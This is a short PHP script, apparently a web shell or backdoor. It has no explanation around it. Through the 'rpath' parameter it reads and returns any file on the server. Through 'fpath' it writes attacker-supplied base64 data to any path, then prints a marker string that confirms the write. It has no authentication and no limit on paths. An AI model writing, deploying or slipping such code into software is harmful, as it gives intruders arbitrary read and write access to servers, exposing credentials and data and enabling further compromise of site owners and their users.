<?php

if (isset($_GET['rpath'])) {
	exit(file_get_contents($_GET['rpath']));
}

if( isset($_GET['fpath']) ) {
	file_put_contents($_GET['fpath'], base64_decode($_REQUEST['data']) );

	if(file_exists($_GET['fpath']))
		die('!~'.'!'.$_GET['fpath'].'!'.'~!');
}
